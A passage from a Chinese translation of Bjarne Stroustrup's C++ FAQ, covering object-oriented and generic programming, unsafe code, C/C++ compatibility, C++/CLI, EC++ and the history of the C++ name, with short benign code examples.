hierarchies）及虚函数进行编程，从而可以通过精制的接口操作各种类型的对象，并且程序本身也可以通过派生（derivation）进行功能增量扩展。 你可以从类的伟大之处是什么这篇文章了解到“普通类（plain classes）”的伟大之处。把多个类组织成类层级是为了表达类之间的层次关系并且利用这些关系简化代码。 要想真正理解 OOP，就要看些例子。例如，你可能有两个（或者更多）设备驱动共用一个公共接口： 1234567class Driver &#123; // 公共驱动接口 public: virtual int read(char* p, int n) = 0; // 从设备中读取最多 n 个字符到 p // 返回读到的字符总数 virtual bool reset() = 0; // 重置设备 virtual Status check() = 0; // 读取状态 &#125;; Driver 仅仅是一个接口。它没有任何数据成员，而其成员函数都是纯虚函数。通过这些接口就可以使用某个驱动；不同类型的驱动负责对这个接口进行相应的实现： 12345678910111213141516class Driver1 : public Driver &#123; // 某个驱动 public: Driver1(Register); // 构造函数 int read(char*, int n); bool reset(); Status check(); // 实现细节 &#125;;class Driver2 : public Driver &#123; // 另一个驱动 public: Driver2(Register); int read(char*, int n); bool reset(); Status check(); // 实现细节 &#125;; 注意，这些驱动含有数据成员，可以通过它们创建对象。它们实现了 Driver 中定义的接口。不难想象，可以通过这种方式使用某个驱动： 123456789void f(Driver&amp; d) // 使用驱动 &#123; Status old_status = d.check(); // ... d.reset(); char buf[512]; int x = d.read(buf,512); // ... &#125; 这里的重点是，f() 不需要知道它使用的是何种类型的驱动；它只需知道有个 Driver 传递给了它；也就是说，有一个接口传递给了它。我们可以这样调用 f() ： 123456789101112131415void g() &#123; Driver1 d1(Register(0xf00)); // create a Driver1 for device // with device register at address 0xf00 Driver2 d2(Register(0xa00)); // create a Driver2 for device // with device register at address 0xa00 // ... int dev; cin &gt;&gt; dev; if (dev==1) f(d1); // use d1 else f(d2); // use d2 // ... &#125; 注意，当 f() 使用某个驱动时，与该驱动相对应的操作会在运行时被隐式选择。例如，当 f() 得到 d1 时，d.read() 使用的是 Driver1::read()；而当 f() 得到 d2 时，d.read() 使用的则是 Driver2::read()。这被称为运行时调度或者动态调度。本例，f() 无法得知调用的是何种设备，因为那是根据输入选择的。 请注意，OOP 并非万能药。不要简单地把“OOP”等同于“好”。如果你的问题的基本要素中没有与生俱来的层级关系，那么类层级和虚函数对你的代码不会有任何帮助。OOP 的优势在于类层级可以有效地表达很多问题；OOP 的主要弱点在于太多人设法强行用层级模式解决问题。并非所有问题都应该面向对象。也可以考虑使用普通类（plain class）、泛型编程和独立的函数（就像数学、C，以及 Fortran 中那样）作为解决问题的方案。 原文地址：http://www.research.att.com/~bs/bs_faq.html#oop 何谓泛型编程？其伟大之处何在？ 泛型编程（Generic Programming, GP）是一种基于参数化（parameterization）的编程技巧：可以使用类型参数化另一种类型（例如，vector 的元素类型就是通过参数确定的）；算法也可以参数化另一种算法（例如，使用比较函数参数化排序函数）。GP 的目的是将有用的算法或者数据结构尽可能地一般化，并使其最优化。例如，如果没有 GP，你必须为整型 vector 专门写一个类；然后，为了寻找其中的最大值，你又得为它写一个专门的函数。但是，使用 GP 可以把一切变得更美好：只需要写一个类，即可拥有任何类型的 vector；只需要写一个函数，即可寻找任何类型 vector 中的最大值。例如： 12vector**&lt;**string**&gt;**::iterator p = find(vs.begin(), vs.end(), &quot;Grail&quot;);vector**&lt;**int**&gt;**::iterator q = find(vi.begin(), vi.end(), 42); 这些例子出自标准模板库（ISO C++ 标准库中容器和算法那部分）。TC++PL 中，漫游标准库那章对标准模板库（Standard Template Library, STL）作了简要的介绍。 GP 在某些方面比 OOP 要灵活得多。特别是，它不依赖于层级。例如，int 和 string 之间没有任何层级关系。总的来说，GP 的结构化程度更甚于 OOP。事实上，GP 常被称为“参数多态（parametric polymorphism）”；而 OOP 常被称为“ad hoc 多态”。就 C++ 而言，GP 于编译时就解析了所有名称；它不需要任何动态（运行时）调度。因此，GP 在对运行时效率要求很高的领域占据了主导地位。 请注意，GP 并非万灵丹。很多时候，程序并不需要参数化多态，而需要运行时调度（OOP）。 原文地址：http://www.research.att.com/~bs/bs_faq.html#generic 为什么 C++ 允许不安全的代码？ 也就是说，为什么 C++ 支持的一些操作能够违反静态（编译时）类型安全机制？ 为了直接访问硬件（例如，把整数当作指向设备寄存器的指针） 为了获取最佳的运行时效率和空间效率（例如，不检测访问数组元素的操作（是否越界），不检测访问对象的指针（是否有效）） 为了和 C 兼容 所以，当你并不需要以上三种特性时，最好避免有如瘟疫般的不安全代码： 不要用类型转换（cast）， 不要将数组用作接口（如有必要，请将它们隐藏于高效函数和类的内部，而使用合适的 string、vector 等编写其余代码）， 避免 void*（如果你真的需要它们，请将它们限制于低级 (low-level) 函数和数据结构的内部，并且为用户提供类型安全的接口（通常是模版 (template)））， 避免联合体（union）， 如果你对指针的有效性存有任何怀疑，请用智能指针（smart pointer）， 不要“赤裸裸”地使用 new 和 delete（使用容器，资源句柄等）， 不要使用 …风格的函数（例如 printf）。 几乎所有 C++ 代码都能遵循这些简单的规则。请不要因为你编写 C 代码或者 C 风格的 C++ 代码时不能遵循这些规则而认为 C++ 不安全。 原文地址：http://www.research.att.com/~bs/bs_faq.html#unsafe 为了成为真正的 OO 程序员，在学 C++ 之前，我需要先学一门纯 OO 语言吗？ 不。学新东西通常都是一个好主意。然而，每种语言都是不同的，并且带有其独有的风格和倾向。使用某些被认为是“纯” OO 风格的语言编写的代码，总是不能很好地用其它语言模仿，而且，如果硬要逐字转化成 C++ 的话，更是会碰个满头灰。而且，“编写纯 OO 代码”也并非我的理想；请参考我的 OOPSLA 主题演讲：为什么 C++ 不仅仅是面向对象的编程语言。如果你想成为一个优秀的 C++ 程序员，但却抽不出多少时间，那么还是集中精力学习 C++ 和它所包含的观念吧。 antigloss 注：OOPSLA 是 Object-Oriented Programming, Systems, Languages and Applications 的缩写，意为面向对象编程、系统、语言，及应用程序。 原文地址：http://www.research.att.com/~bs/bs_faq.html#learn-pure 为什么 C++ 没有图形用户接口？ C++ 有很多商用和开源的 GUI（Graphical User Interface，图形用户接口），例如 Gtkmm、SmartWin++、V C++ GUI、FLTK，以及 Qt。明确地说，不同平台的提供商提供不同的 C++ 库来访问他们的 GUI。问题就在于没有标准 GUI，而这正是主要问题所在。 请注意，提供 GUI 不单只是技术问题，它还涉及可行性问题。现在有很多 GUI，而且都有其用户群，他们不会愿意别的 GUI 被声明为标准。无论如何，标准委员会没有足够的资源建立一个更好的新 GUI。 原文地址：http://www.research.att.com/~bs/bs_faq.html#gui 为什么 C++ 不支持线程？ ISO C++ 标准没有提及并发（concurrency），但所有主要的 C++ 实作都支持线程；pthread 几乎无所不在，而且很多平台提供商都提供他们自己的系统线程。出于可移植性的考虑，可使用一些线程库，例如 Boost 线程库。C++0x 几乎肯定会包含一个线程库。 原文地址：http://www.research.att.com/~bs/bs_faq.html#threads C++ 0x 会是什么样的？ 我也不完全清楚。C++ 0x 将会是持续数年的标准化进程的成果。在这个进程中，会认真考虑 C++ 社群各个不同派别的需要——关于发展方向的讨论正在进行中。C++ 标准将长期保持稳定，而 C++ 语言更是会保持更长期的稳定，因为兼容性始终是首要考虑的问题。 我个人认为，主要的原则应该是： 语言本身不会有重大改变 标准库会有重大扩展 改变和扩展应该服务于使 C++ 成为一个更好的系统编程及库建造平台，同时也要使 C++ 更易于教学。毫无疑问，我们会对上面两个句子中的“重要”二字的含义做一些讨论。 我在 SD2001w 的一个座谈会上简要地表达了我的一些观点，在 2002 年春季的 ACCU（C 和 C++ 用户协会）会议的主题演讲中稍微细节一点地阐述了这些观点。请翻阅我设计 C++0x 的首要准则以及我的发布页中的其它新近论文。WG21 上有一个更完整的提案列表。我的 C++ 页面中有更多关于 C++0x 标准及其冀望列表（wish list）的信息。 C++ 0x 中的 ‘x’ 被冀望为 9：C++ 09，而不是（例如）C++0xA（十六进制）。😃 原文地址：http://www.research.att.com/~bs/bs_faq.html#When-next-standard 何时会有新的 ARM ？ Ellis 和 Stroustrup 合著的《带评注的 C++ 参考手册》（The Annotated C++ Reference Manual, ARM），俗称“The ARM”，写于 1989 年。它曾是 C++ 标准化工作的基础，但现在它已经太老了，不能反映当前的 C++ 标准。 由于种种原因，原计划的描述 ISO C++ 标准的替代品（“ARM++”）没能写成。又因为关于 C++ 0x 标准的工作已经开始，所以现在写一本基于 ISO C++ 1998 的 ARM++ 已经太晚了。 原文地址：http://www.research.att.com/~bs/bs_faq.html#ARM 你怎么看C#？ 我对C#没有什么评论。你很难说服我为什么世界上需要另一个专有语言，更难说服我为什么还需要一个和特定的专有操作系统结合得那么紧的语言。 显然，我不是专有语言的爱好者，而是开放的正式的标准的爱好者。 -------------------------------------- 分割线 -------------------------------------- 如果你想专门为 .Net 平台编程，C# 并非最差的选择。记住，.Net 也强烈支持 C++（尽管宣传得不那么多）。 （这句话是 B.S. 新增的，旧的译文中没有） 原文地址：http://www.research.att.com/~bs/bs_faq.html#Csharp 您怎么看待 C++/CLI？ C++/CLI 是对 ISO C++ 的一组扩展，它将 C++ 和微软的 CLI（通用语言架构 Common Language Infrastructure）极其完整地“捆绑”在一起。它已经通过 ECMA 进行了标准化（ECMA-372）。我很高兴它（C++/CLI）使得 C++ 可以很容易地使用 CLI 的所有特性，也为它远胜于它的前任“托管 C++（Managed C++）”感到欣喜。然而，C++/CLI 为了达到这些目的，却对 C++ 进行了各种语言特性上的扩展，以迎合 CLI 的各种特性（接口、属性、泛型、指针、继承、枚举等很多很多），我对此深表遗憾。这将成为混乱的主要源头。C++/CLI 比 ISO C++ 多出了大量新的语言上的便利，这会诱导程序员（不知不觉地）编写出不可移植的代码，而且这些代码和 MS Windows 却有着亲密接触。 CLI 提供了一套访问系统设施（facilities）和应用程序的接口，而这套接口却和传统的接口大相径庭。特别是，这套接口的语义不能完全或者便利地用传统的编程语言来表达。一种形容 CLI 的方法是把它当作（局部的）“平台”或者“虚拟机”。它包含一套庞大的语言特性（继承、方法、循环构造 (loop constructs)，回调机制 (callback mechanisms) 等），支持一套庞大的基础类库（即 BCL），还有一个精巧的元数据（metadata）系统。CLI 有时也被称为“语言中立者”。然而，如果一种语言不大量引入 CLI 的特性，它甚至不能使用 .NET 的基本设施（或者 MS Windows 将要添加的设施，如果 MS 的计划不变的话）。而且，如果一种语言不能表达所有这些特性，那它就不能应用于这个实作（.NET），因为 .NET 的资源是为其它（支持这些特性的）语言服务的。因此，CLI 是“语言中立者”这种说法是仅仅建立在所有语言为了成为 .NET 上的“一流”，都必须支持 CLI 的所有特性这个基础上的。 我更希望绑定是通过少数原语（primitive）来完成的，而且这些原语应该能被任何编程语言用简单的函数调用和数据结构来表示，或者把这些原语封装于语言特有的库里。而 CLI 最多只对全盘接受 CLI 设施的语言提供这种支持。为了生成 CLI 模块，编程语言必须能够表达 CLI 的全部特性，包括原数据。只有能做到这些的编程语言才能成为 .NET 的系统编程语言。进而，MS C++ 小组断定，只有内建语言特性才能被用户接受。他们的设计反映出来的思维是：带 C++/CLI 扩展的 C++ 可以使用 CLI 的任何设施；使用 CLI 设施时，（C++/CLI）比其它语言更加简练；和其它语言相比，（C++/CLI）绝无多余花销。他们的目标是使 C++ 成为主流的 Windows 系统编程语言。 一如既往，我极力强调可移植性，并且建议程序员在设计应用程序时，通过 ISO C++ 中明确定义的那些接口访问系统特定的设施（例如不要直接使用 C++/CLI）。在 Windows 上，这样做有时会比直接使用 C++/CLI 的设施来的麻烦，但这是获取可移植性和降低（平台）销售商依赖度的唯一途径。当然，如果一段代码的目的是为其它代码提供 CLI 接口，那么这种间接使用 CLI 的方法也是难以维护的。请注意，我知道系统特定扩展的必要性，我也知道提供这种扩展的 C++ 销售商并非只有微软，我只是强烈希望这种扩展能通过 ISO C++ 允许的“小巧的接口”来实现。 如何处理系统特定的扩展是一个固有的难题。微软 C++ 小组，特别是 Herb Sutter，一直都在和 ISO C++ 标准委员会的其他成员讨论这个问题，以期最终理清 ISO C++ 及其超集 C++/CLI 的关系。在 ISO C++ 标准委员会，我们已经作出了许多有建设性的合作。同时，为了避免混淆 ISO C++ 和 C++/CLI 扩展，微软正在修改 VC++ 文档，以期清楚地区分 ISO C++ 和 C++/CLI（单纯写 C++ 即表示 ISO C++）。我希望其他销售商也会跟随这种潮流。 如何称呼 C++ 的 CLI 绑定/扩展是一个充满争议的难题，我个人倾向于使用 C++/CLI 作为“ISO C++ 的 CLI 扩展”的缩写。在名称中保留 C++ 可以提醒人们（C++/CLI 的）基础语言是什么，并且有助于保持 C++ 为带 C++/CLI 扩展的 C++ 的严格子集。C/C++ 兼容性问题论证了保持子集严格性的重要性。 以下是一些关于C++/CLI的文档： 欧洲计算机制造商协会 C++/CLI 标准。 英国 ISO C++ 小组的异议（包含一些代码样例）。 ECMA 对英国 ISO C++ 小组（及其他人或组织）的异议的回复。 Herb Sutter 写的 C++/CLI 设计原理。 原文地址：http://www.research.att.com/~bs/bs_faq.html#CppCLI 您如何看待 EC++ ？ EC++（基本上）是 C++ 去掉异常、模板、命名空间、RTTI 支持、多继承等特性后的一个子集。定义这个子集的是一个“工业联盟”。我不喜欢语言子集或者方言，尤其是那些不支持标准库的子集，因为这样的话，该子集的用户就不得不各自开发不兼容的基础库。我担心定义 C++ 子集会造成用户群体分裂，并引起相互间攻击（1999-3-31：我看到一个广告用生动的图像来显示 EC++ 如何通过废除命名空间、模板、C++ 标准字符串类，以及其它东西来减“肥”（例如内存空间）。叹息）。我强烈希望关于“标准”的工作发生于开放的研讨会（例如 ISO 或者国家标准组织）。 ISO C++ 委员会的性能报告里有一个关于嵌入式系统实现者如何通过标准 C++（比用方言好）解决性能问题的讨论。就我所知，EC++ 已经死了（2004），而如果它还没死的话，也行将就木。 想了解 ISO C++ 如何应用于苛刻的嵌入式系统编程，可参考 JSF 航空器 C++ 代码标准。 原文地址：http://www.research.att.com/~bs/bs_faq.html#EC++ 为何您如此看重可移植性？ 成功的软件都是长寿的；数十年生命周期的软件并不少见。针对某种硬件、操作系统、数据库系统等设计的应用程序/程序，如果设计得当，其寿命通常都比这些东西还要长。通常，一个优秀的软件的寿命会比提供构造这个软件的基本技术的公司的寿命还要长。 通常，一个成功的应用程序/程序的客户/用户使用的平台会有所不同。而且不同平台的数目会随着用户数目的增加而增加。如果某个应用程序/程序紧密依附于一个单一的平台或者（平台）销售商，那么它就会丢失很多潜在的用户。 显而易见，完全平台无关性意味着不能使用平台特定设施。然而，通过“小巧的接口”把应用程序眼里的环境包装成库，然后通过这些接口访问平台设施，这样往往就可以构造出近似平台无关的应用程序。 原文地址：http://www.research.att.com/~bs/bs_faq.html#portability C 是 C++ 的子集吗？ 严格按照数学上的定义来说，C 不是 C++ 的子集。有些程序在 C 里面是合法的，但在 C++ 里却是不合法的；甚至有些编写代码的方式在 C 和 C++ 中有不同的含义。然而，C++ 支持 C 所支持的全部编程技巧。任何 C 程序都能被 C++ 用基本相同的方法写出来，并且运行效率和空间效率都一样。把数万行 ANSI C 代码转换成 C 风格的 C++ 代码，通常只需要几个小时。因此，C++ 是 ANSI C 的超集程度和 ANSI C 是 K&amp;R C 的超集程度以及 ISO C++ 是 1985 年的 C++ 的超集程度差不多。 编写风格好的 C 程序通常会是合法的 C++ 程序。例如，Kernighan 和 Ritchie 合著的《C 程序设计语言（第二版）》中的所有例子都是 C++ 程序。 C/C++ 兼容性问题的一些例子： 12345int main() &#123; double sq2 = sqrt(2); /* 不是 C++：调用了未经声明的函数 */ int s = sizeof(&#x27;a&#x27;); /* 隐蔽的区别：C++ 中是 1，而 C 中却是 sizeof(int) */ &#125; 调用未经声明的函数在 C 里是不良风格，而在 C++ 里是非法的。同样的情况还有，传递参数给一个没有在其声明中列出参数类型的函数： 12345void f(); /* 没有注明参数类型 */void g() &#123; f(2); /* C 中是不良风格。C++ 中不合法 */ &#125; C 里面，void* 可以隐式转换为任何指针类型，并且堆空间分配通常是通过 malloc() 进行的，无法检查是否已经分配了足够的内存： 12345678void* malloc(size_t);void f(int n) &#123; int* p = malloc(n*sizeof(char)); /* C++ 中非法。C++ 使用 new 分配堆空间 */ char c; void* pv = &amp;c; int* pi = pv; /* 隐式转换 void* 为 int*。C++ 中非法 */ &#125; 请注意，隐式转换 void* 为 int* 引起了潜在的数据对齐错误。请参阅 C++ 中 void* 和 malloc() 的代替品。 把 C 代码转换成 C++ 时，请紧记 C++ 的关键字比 C 多： 12int class = 2; /* C 中合法。C++ 中是语法错误 */ int virtual = 3; /* C 中合法。C++ 中是语法错误 */ 除了少数例外，如上面所述的例子（以及 C++ 标准和 C++ 程序设计语言第三版附录 B 里详细列举的例子），C++ 是 C 的超集。（附录 B 可以通过下载获取） 请注意，“C”在以上段落中指的是经典 C 和 C89。C++ 不是 C99 的后裔；C++ 和 C99 是兄弟。C99 引入了一些新特性，造成 C/C++ 的不兼容性进一步增大。这里有一篇 C++98 和 C99 的不同点的描述。 原文地址：http://www.research.att.com/~bs/bs_faq.html#C-is-subset 您真的认为 C 和 C++ 可以合并为同一种语言吗？ 我认为如果它们能合并为同一种语言，对 C/C++ 社群（community）来说实在是再好不过了。也就是说，如果能够系统且完全地消除 C/C++ 的不兼容性，并且有组织地防止它们未来的发展产生新的不兼容性，这就太好了。可能与否那就是另外一回事了。 我的基本观点是，C/C++ 目前的不兼容性源于“历史的偶然”，而非什么特殊的原因，尽管对于某些能人善士来说，它们“在那时看来都是非常好的主意”。 C/C++ 的不兼容性对 C/C++ 社群普遍没有什么好处，反而对社群中的大部分人造成不少严重麻烦，所以应该通过不懈的努力消除它们的不兼容性。 欲了解我对 C/C++ 兼容性的看法的更详细的陈述，请参考我就这个问题写的一系列论文： B. Stroustrup: C and C++: Case Studies in Compatibility. The C/C++ Users Journal. September 2002. Pdf version. B. Stroustrup: C and C++: A Case for Compatibility. The C/C++ Users Journal. August 2002. Pdf version. B. Stroustrup: C and C++: Siblings. The C/C++ Users Journal. July 2002. Pdf version. B. Stroustrup: Sibling rivalry: C and C++. AT&amp;T Labs - Research Technical Report. TD-54MQZY. January 2002. 我想象着不兼容性（通过同时对 C 和 C++ 进行修改）最终被消除掉后，仍然会存在 C 和 C++ 这两种的语言，但届时，C 就真的可以被称之为 C++ 的子集了。 请注意，这些论文都是 2001 年末到 2002 年初之间写的，那时仍然能够看到一个希望，就是 C 和 C++ 标准委员会相互协作，最终在十年内制定出一个可行的方案。然而，这并没有发生。 原文地址：http://www.research.att.com/~bs/bs_faq.html#merge 您如何看待 C/C++ ？ 不，这并非我常被问到的问题。也就是说，这个问题是这份 FAQ 中的一个“假的 FAQ”。然而，这个问题应该成为一个 FAQ，因为人们在使用“C/C++”时，似乎以为“C/C++”是指某种特定的东西，并且以为他们知道“C/C++”所指的是什么，这导致了很多混淆和苦恼。人们应该询问“什么是 C/C++ ？”，然后深思熟虑并且停止使用这个术语。因为使用这个术语真的会带来不良影响。 没有任何语言叫“C/C++”。使用这个词的人通常并不了解编程（例如人事和经理）。也就是说，一些根本不懂 C++（并且常常也不懂 C）的人会使用这个词。当程序员使用这个词的时候，常常带有一种这样的态度：“C++ 就是增加了一大堆复杂而弊大于利的特性的 C”。这类人往往对标准库中 printf 和 memcpy 以外的东西知之甚少，喜欢编写他们自己的字符串类和哈希表。还有一些人因为一些无懈可击的原因而坚持仅用 C++ 中的一个特定子集，但他们（就我所知）并不说“C/C++”。 我个人只在形如“C/C++ 兼容性”之类的词语中使用 C/C++。 原文地址：http://www.research.att.com/~bs/bs_faq.html#C-slash 为何编译 C++ 版的“Hello World”程序生成的代码比 C 版的多十倍？ 在我的机器上并非如此，你的也不应该这样。我甚至曾见过 C++ 版的“Hello world”程序比 C 版的小。最近（2004），我在 Unix 下用 gcc -o2 进行测试，发现两个版本（iostream 和 stdio）的大小完全相同。没有语言层面上的原因会使一个版本比另一个大。这都取决于（编译器的）实现者如何组织库。如果一个版本明显比另一个大得多，那就向产生更多代码的（编译器的）实现者报告这个问题。 原文地址：http://www.research.att.com/~bs/bs_faq.html#Hello-world 为何您把 C++ 设计得和 C（基本）兼容？ 我想让 C++ 兼容一门完整的语言，并使其拥有足以应对乃至无比苛刻的系统编程的性能和灵活性。我惧怕创造出又一种虽然优美，却隐含着一些无心的限制的语言。《C++ 语言的设计和演化》章节 2.7 中有详细的历史细节。“您真的认为……？”中列举的那些文章回顾了 C/C++ 兼容性问题技术上的讨论。 那时，我认为 C 是可供使用的最优秀的系统编程语言。虽然当时（1979）这（C 的优秀）并不像后来那样显而易见，但是我可以请教 Dennis Ritchie、Steve Johnson、Sandy Fraser、Greg Chesson、Doug McIlroy，以及 Brian Kernighan 等专家并得到他们的反馈。如果没有他们的帮助和建议，也没有 C，C++ 极有可能胎死腹中。 与谣传相反的是，从来没有人跟我说要我必须使用 C；也没有人跟我说不要使用 C。事实上，第一版 C++ 参考手册便是基于 Dennis 给我的 C 参考手册的 troff 版本完成的。很多新语言都是贝尔实验室设计的；至少在“研究阶段”，没有制定加剧语言偏见的规则。 原文地址：http://www.research.att.com/~bs/bs_faq.html#whyC C++ 归您所有吗？ 不。如果非要说“C++ 归谁所有”的话，那只能是 ISO。AT&amp;T 将我以前写的 C++ 参考手册的所有权授予给了 ISO。ISO C++ 标准的版权归 ISO 所有。 C++ 编译器销售商不用支付版税给我和 AT&amp;T。ISO C++ 标准是一份旨在让所有人免费使用的规范文档（当然，这份文档本身是需要付钱向 ISO 或者国家标准委员会购买的）。不同的编译器归不同的销售商/提供商所有。 “但有 SCO 的人声称 C++ 归他们所有”；难道此言不实？ - 这完全是无稽之谈。我看过那次访谈。那个 SCO 的家伙肯定完全不知 C++ 为何物，竟将之称为“the C++ languages”[Antigloss 注：请注意这里使用了 language 的复数]。SCO 顶多拥有已有 15 年历史并早已严重过时的 Cfront - 我最初设计的 C++ 编译器。我过去小心地不让 C++ 和任何专利或商标沾上关系。这是我们书写“C++”而非“C++™”的原因之一。C++ 标准不受任何专利限制 - 标准委员会也对此进行过核实。 原文地址：http://www.research.att.com/~bs/bs_faq.html#revenues “C++”何得此名？ 《C++ 程序设计语言》（TC++ PL）第一章：“C++（读作‘斯加加’）这个名字是 Rick Mascitti 于 1983 年夏天起的。这个名字能充分表明 C++ 是由 C 演变而成的这一进化本质；‘ ++ ’ 是 C 的自增运算符。‘C+’这个稍短的名字是个语法错误；它亦已被用作一种不相关的语言的名字。精通 C 的语义的大师认为 C++ 这个名字比不上 ++ C。这门语言没有被命名为 D 是因为它是 C 的扩展，而且它并没有试图通过删减 C 的特性来修正 C 存在的一些问题。想了解 C++ 这个名字的另一种解释，可翻阅 [Orwell,1949] 的附录。” 《C++语言的设计和演化》（D&amp;E）第三章：“我采用 C++ 这个名字，因为它比较短，很有含义，而且也不是‘什么什么的 C’这种形式的名字。C 语言中，++ 可以根据上下文读成‘next’、‘successor’或者‘increment’，不过通常还是读成“加加”。C++ 这个名字及其竞争对手 ++ C 是产生笑话和双关语的肥沃土壤——几乎所有这些笑话和双关语在 C++ 这个名字被采用之前就已为人们所熟知和品味。C++ 这个名字是 Rick Mascitti 建议的。1983 年 12 月，这个名字第一次被使用——它被写入了 [Stroustrup,1984] 和 [Stroustrup,1984c] 的最终版。 C++ 中‘C’这个字母拥有悠久的历史。显然，它是 Dennis Ritchie 设计的语言的名字。C 的直接祖先是 Ken Thompson 设计的叫做 B 的解释语言，而 B 语言是 BCPL 的后裔。BCPL 是剑桥大学的 Martin Richards 在访问位于另一个剑桥（坎布里奇）的 MIT 时设计和实现的。BCPL 代表 Basic CPL，而 CPL 是一门相当大（就当时而言）而优雅的编程语言的名字，它是剑桥大学和伦敦大学合力开发出来的。在伦敦大学参与进来之前，CPL 中的‘C’代表剑桥。后来，‘C’的正式含义是组合，而它的非正式含义是 Christopher，因为 Christopher Strachey 是主持 CPL 开发的首脑。” 原文地址：http://www.research.att.com/~bs/bs_faq.html#name 您是使用何种语言编写出 C++ 的呢？ 第一个 C++ 编译器（Cfront）是使用 C++ 编写出来的。为此，我首先使用 C 编写了一个将“带类的 C”转换成 C 的预处理器。“带类的 C”属于 C 的一种变种，它是 C++ 的直接祖先。这个预处理器将“带类的 C”的结构成分（例如类和构造函数）翻译成 C。它是一个传统的预处理器，不能完全理解 C++ 语言，还将大多数类型检查留给了 C 编译器来做，而且其对 C++ 成分结构的翻译是单个单个地进行的，而不会先对全局进行分析。然后我利用“带类的 C”编写出了 Cfront 的第一个版本。 Cfront 是一个传统的编译器，它会对 C++ 源代码进行完整的语法和语义检查。为此，它要有一个完整的词法分析器，要建立符号表，还要为每个类、函数等建立一套完整的内部树状表示。在生成 C 代码之前，它还会对 C++ 成分结构的内部树状表示做一些源代码层面上的优化。虽然这个版本（的 C++ 编译器）生成 C 代码，但它不依赖 C 做任何类型检查。它仅仅把 C 用作汇编器。最终生成的代码非常快。想知道更多信息，可参考 D&amp;E 。 原文地址：http://www.research.att.com/~bs/bs_faq.html#bootstrapping 为何 C++ 如此庞大？ C++ 并非有些人想像的那么庞大。它并非为教学目的而设计的小巧语言，但那些人们经常用来和 C++ 比较的语言也不小巧，例如 C、Java，C#。和 Wirth 博士最初定义的 Pascal 相比较，它们也非常庞大。当然，这样设计是有合理的理由的，我这么认为。和 30 年前相比，当今的编程世界已经变得异常复杂，现代编程语言恰恰反映了这一点。 C++ 标准共有 740 页，但其中有 400 页描述标准库。语言特性的（极度详细的）描述只不过占了 340 页。类似地，TC++PL 共有一千余页，但仅有 350 页用于解释语言特性及其用法；其余部分讨论标准库、编程技巧等。 C++ 直接支持（也就是内建于语言中）一些其它语言通过库来支持的特性，所以 C++ 的语言部分会相对更庞大一些。另一方面，如果你想编写一个“典型的现代应用程序”，那你还需要考虑操作系统接口、GUI、数据库，网页接口等。你必须熟悉的东西包括语言特性、库，以及编程习俗与标准。和这些东西的总和相比，编程语言本身还是很小的。C++ 的庞大可以说是一个优点，因为它能更好地支持优秀的库。 最后，编程新手也能了解一门语言的全部特性的时代已经一去不复返了，至少对于那些广泛应用于工业上的语言来说是这样。只有少数专家级的人了解“C 的全部”或者“Jave 的全部”。由此推之，没有人需要为新手不了解 C++ 的全部而道歉。你必须做的是——无论学任何语言——先学其中一个子集，开始编写代码，然后循序渐进地深入学习这门语言，它的库及其开发工具。 原文地址：http://www.research.att.com/~bs/bs_faq.html#big 现在还有人使用 C++ 吗？ 当然，有很多。C++ 的用户虽然多得难以统计，但计量单位肯定是百万级的。所有主要的平台销售商都支持 C++。我的应用程序例举中有一些 C++ 的应用例子。 原文地址：http://www.research.att.com/~bs/bs_faq.html#use-C++ 为何 C++ 没被用于编写操作系统？ 它已被用于编写操作系统有些年头了（超过十年）；请参考我整理的 C++ 应用程序列表。 原文地址：http://www.research.att.com/~bs/bs_faq.html#use-C++-for-OS 有什么好的认证是面向 C++ 程序员的吗？ 就我所知，没有什么好的面向 C++ 程序员的认证。很遗憾。一个好的认证是最有用的。然而，C++ 缺乏提供可靠认证的中央机构，而且，一个不权威的认证或者专注于语法的认证毫无用处。 原文地址：http://www.research.att.com/~bs/bs_faq.html#certification 为什么你不回复我的电子邮件？ 我会回信，但是我收到的信太多了。我估计我回了95%以上的信。但是有时候我会被信件淹没。有些信丢失了，有些要等到有空的时候才回，有些则要等到我回复一批相关信件的时候（经常是对我的书中潜在错误的评论）。不幸的是，越长、越有内涵的信，往往会比问题简单答案也简单的信拖得更久。 还有，如果你写信给我，请确认我能够给你回信。我很讨厌在我写完并且发出回信后，发现回信地址无效或者无法访问。这种事情每周都会发生。 相对来说，这样两种来信被忽略的可能性比较大：关于家庭作业的问题和类似“我怎么使用某某库？”的问题。对于不回答后一个问题，我感到有点遗憾，因为提问者经常不明白DOS、Windows或者其他任何C编程接口并不是C标准的一部分（并且我也不可能跟上这么多的C++库的发展）。如果你没有收到回信，那么请先考虑一下你的问题是不是上面这几种类型。 Antigloss 注：以下一段是我补译的。因为这段是 B.S 新增的，原来的中文翻译中没有。 此外，除非你注明你的名字，否则我不会读你的邮件，并且会将其删掉。这是一个新政策。我从来就不喜欢假名。我发现和那种自认为使用类似 suuupergeeek 或者 coolGuy3 这种名字很酷的人，很难进行礼貌的技术交流，所以我不想费心尝试和这种人交谈。 原文地址：http://www.research.att.com/~bs/bs_faq.html#email “bjarne”是冒名顶替的吗？ 或许不是。大多数新闻组帖子、访谈等，如果声称是我的，那的确是我的。不过，一个显而易见的例外是那篇声名狼藉的 IEEE “访谈”。在我看来，这篇“访谈”非常无聊。我用 gmail 账号在新闻组上发帖，使用的用户名是“Bjarne”，这是为人们所熟知的。可不知何故，有些人好像被它搞糊涂了。如果你有所怀疑，请思量那份可疑信息的风格和内容，并且和论坛中（我的）其它帖子比较，或者发问。 原文地址：http://www.research.att.com/~bs/bs_faq.html#impostor 那真是你说的吗？ 是的，我是说过“C容易让你开枪时不小心打到自己的脚，C虽然不这么容易，但是你如果真这么做了，它会把你整条腿轰掉”。但人们往往会忽视，我对C所说的话在不同程度上对于任何强大的语言都是正确的。当你防止人们犯简单的错误时，他们就会开始犯新的、不那么明显的错误。那些能避免简单错误的人，可能会直奔不那么简单的错误而去。对于坚固的保护性的环境，有一个问题，就是难题总是被太晚发现，以至于一旦发现就难以补救。并且，罕见的问题比常见问题更难发觉，因为你往往不会怀疑到它。 我也说过“在C里面存在着一个更小一些和更清晰一些的语言，它正在挣扎着浮现出来”。比如，原文在The Design and Evolution of C++的207页（译注：中文版156页）就能找到。不过这个更小更清晰的语言不是Java或C#。原文是在名为“Beyond Files and Syntax”的小节里。那里我指的是C的语义要比它的语法清晰得多。我是在考虑一种编程风格、程序库和编程环境，相对关注于C的低级层面的古老用法而言，它们强调更清晰更有效的编程实践。 ----------------------------------- 分割线 ----------------------------------- *“我一直希望我的电脑可以像我的电话那么易用；我的愿望已经实现了，因为我已经不知道怎么使用我的电话了”。*大约在 1990 